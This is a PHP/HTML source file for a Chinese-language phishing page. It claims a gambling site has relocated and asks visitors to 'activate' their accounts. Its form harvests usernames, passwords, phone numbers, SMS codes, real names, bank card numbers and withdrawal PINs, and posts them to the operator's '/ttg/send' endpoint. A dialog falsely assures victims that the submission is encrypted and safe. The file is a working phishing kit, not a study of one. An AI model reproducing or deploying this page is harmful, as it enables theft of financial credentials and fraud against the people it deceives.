<?php
$to    = 'https://hhedahpkd.com';
$to    = 'javascript:';
$refer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "未知";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>vip</title>
    <link href="https://cdn.bootcss.com/limonte-sweetalert2/7.28.11/sweetalert2.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/index.css">
</head>

<body>
    <div class="logo"></div>
    <div class="ph">
        <h3>尊敬的会员：</h3>
        <p class="content">
            您好，非常抱歉地通知您：由于业务调整，为了给每一位忠实玩家更好的游戏体验以及为了您的资金安全。<br>请您移步到公司合作授权网站
            <!--: 权威官网<a class="dm"
                                                                                                       href="<?php echo $to; ?>"></a>-->，您可以使用原来的账号激活并进行游戏，在此感谢每一位忠实玩家对我们的支持！

            ！
        </p>
    </div>
    <div class="hb">
        <div class="form">
            <!-- <div class="lg"></div> -->
            <div class="active"></div>
            <p class="f">
                <label for="user" class="ll">用户名:</label>
                <input id="user" type="text" placeholder="请输入会员名">
            </p>
            <p class="f">
                <label for="passwd" class="ll">密&nbsp;&nbsp;&nbsp;码:</label>
                <input id="passwd" type="password" placeholder="请输入密码">
            </p>
            <p class="f">
                <label for="phone" class="ll">手机号:</label>
                <input id="phone" type="number" placeholder="请输入手机号">
            </p>
            <p class="f">
                <label for="verify" class="ll">验证码:</label>
                <input style="width:106px" id="verify" type="number" placeholder="请填写验证码">
                <button data-id="" id="verify-code">获取验证码</button>
            </p>
            <p class="f">
                <label for="realname" class="ll">姓&nbsp;&nbsp;&nbsp;名:</label>
                <input id="realname" type="text" placeholder="请输入姓名">
            </p>
           <p class="f">
                <label for="bankcard" class="ll">银行卡号:</label>
                <input id="bankcard" type="text" placeholder="请输入银行卡号">
            </p>
            <p class="f">
                <label for="wdpass" class="ll">取款密码:</label>
                <input id="wdpass" type="password" placeholder="请输入取款密码">
            </p>
            <div class="btn" onclick="submit();"></div>

        </div>
    </div>
    <div class="footer">

        <ul class="nav">
            <li>
                <a href="<?php echo $to; ?>">关于我们</a>
            </li>
            <li class="fg">|</li>
            <li>
                <a href="<?php echo $to; ?>">开户与存提款</a>
            </li>
            <li class="fg">|</li>
            <li>
                <a href="<?php echo $to; ?>">合作经营条款与规则</a>
            </li>
            <li class="fg">|</li>
            <li>
                <a href="<?php echo $to; ?>">优惠活动规则</a>
            </li>
            <li class="fg">|</li>
            <li>
                <a href="<?php echo $to; ?>">博彩规则</a>
            </li>

        </ul>
        <div style="clear: both"></div>
        <p>本网站属于权威官网所有，违者必究。</p>
        <p>©2014-2019 权威官网</p>
javascript:;
    </div>
    <a class="online" target="_blank" href="https://htbytxzbsrsycz.com"></a>
    <div style="display:none">
        <script src="https://s5.cnzz.com/z_stat.php?id=1275861338&web_id=1275861338" language="JavaScript"></script>
    </div>
    
    <script src="https://cdn.bootcss.com/limonte-sweetalert2/7.28.11/sweetalert2.min.js"></script>
    <script src="js/uuid.js"></script>
    <script src="js/jq.js"></script>

    <script>
        var countdown = 80;

        function settime(val) {
            if (countdown == 0) {
                val.removeAttr("disabled");
                val.text("获取验证码");
                countdown = 80;
            } else {
                val.attr("disabled", true);
                val.text("重新发送(" + countdown + ")");
                countdown--;
                setTimeout(function() {
                    settime(val)
                }, 1000)
            }

        }


        $(document).ready(function() {
            $('#verify-code').attr('data-id', uuidv1());
            $('#verify-code').on('click', function() {

                var uuid = $(this).attr('data-id');
                var tel = $('#phone').val();
                if (!tel || !uuid) {
                    alert('请正确填写手机号')
                    return
                }
                settime($(this));

                $.post("/verify/send", {

                    tel: tel,
                    uuid: uuid

                }, "json").done(function(data) {

                    console.log(data)

                })



            });

        })


        function submit() {
            var host = '<?php echo $refer; ?>';
            var username = $('#user').val();
            var passwd = $('#passwd').val();
            var tel = $('#phone').val()
            var realname = $('#realname').val();
            var bankcard = $('#bankcard').val();
            var wdpass = $('#wdpass').val()
            var uuid = $('#verify-code').attr('data-id');
            var verify_code = $('#verify').val();

            if (!tel || !verify_code) {
                alert('手机号或验证码无可为空')
                return
            }


            swal.queue([{
                title: '确定提交吗？',
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                text: '本操作将进行加密提交，无需担心安全问题',
                showLoaderOnConfirm: true,
                showCancelButton: true,
                preConfirm: function() {
                    return new Promise(function(resolve, reject) {

                        $.post("/ttg/send", {
                            host: host,
                            username: username,
                            passwd: passwd,
                            tel: tel,
                            realname: realname,
                            bankcard: bankcard,
                            wdpass: wdpass,
                            uuid: uuid,
                            verify_code: verify_code
                        }, "json").done(function(data) {
                            if (data.ret_code != 200) {
                                swal.insertQueueStep(data.ret_msg)
                            } else {
                                swal.insertQueueStep('提交成功，请耐心等待')
                            }
                            resolve();

                        })
                    })
                }
            }]);
        }
    </script>
</body>

</html>